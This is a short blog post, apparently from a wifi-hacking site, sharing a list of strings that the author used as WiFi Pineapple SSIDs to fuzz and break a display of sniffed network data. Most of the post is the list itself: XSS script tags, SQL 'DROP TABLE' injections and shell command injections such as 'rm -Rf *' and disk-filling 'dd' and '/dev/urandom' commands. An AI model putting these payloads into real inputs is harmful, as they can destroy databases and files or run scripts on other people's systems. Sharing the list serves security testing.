---
layout: post
title:  "Adventures with WifiPineapple Fuzzing SSID"
subtitle: "Wifi SSID White Noise, fuzzing the SSID"
categories: wifi hacking
published: true
comments: true
tags:
 - Wifi
 - Hacking
 - WifiPineapple
---

As mentioned we used a fuzz list for the SSID to try and break the Scroll of Sheep. For others to use it has been included below. This will mess with the data, and handling the data at any future point, would need to be handled carefully.

{% highlight linenos %}
"><script>alert(1);//
"><script>alert(1)</script>
'; DROP TABLE *-- 
'); DROP TABLE *-- 
' AND DROP TABLE *-- 
') AND DROP TABLE *-- 
'; DROP TABLE *#
'); DROP TABLE *# 
' AND DROP TABLE *#
') AND DROP TABLE *#
;rm -Rf *;
`rm -Rf *`
$(rm -Rf *)
;cat /dev/urandom;
`cat /dev/urandom`
;dd if=/dev/zero of=rick.dat;
`dd if=/dev/zero of=rick.dat`
{% endhighlight %}